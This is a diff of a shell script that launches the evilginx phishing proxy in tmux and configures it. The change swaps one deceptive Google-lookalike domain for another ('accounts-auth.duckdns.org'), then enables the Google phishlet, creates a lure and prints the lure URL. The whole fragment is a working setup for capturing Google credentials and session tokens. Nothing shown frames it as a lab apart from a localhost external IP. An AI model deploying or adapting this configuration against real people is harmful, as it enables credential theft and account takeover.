@@ -10,9 +10,9 @@ tmux new-session -d -s evilginx '/app/evilginx -p /app/phishlets'
 sleep 3
 
 # 4. Send the configuration commands (using C-m which is the tmux equivalent of Enter)
-tmux send-keys -t evilginx "config domain accountauth.duckdns.org" C-m
+tmux send-keys -t evilginx "config domain accounts-auth.duckdns.org" C-m
 tmux send-keys -t evilginx "config ipv4 external 127.0.0.1" C-m
-tmux send-keys -t evilginx "phishlets hostname google accountauth.duckdns.org" C-m
+tmux send-keys -t evilginx "phishlets hostname google accounts-auth.duckdns.org" C-m
 tmux send-keys -t evilginx "phishlets enable google" C-m
 tmux send-keys -t evilginx "lures create google" C-m
 tmux send-keys -t evilginx "lures get-url 0" C-m
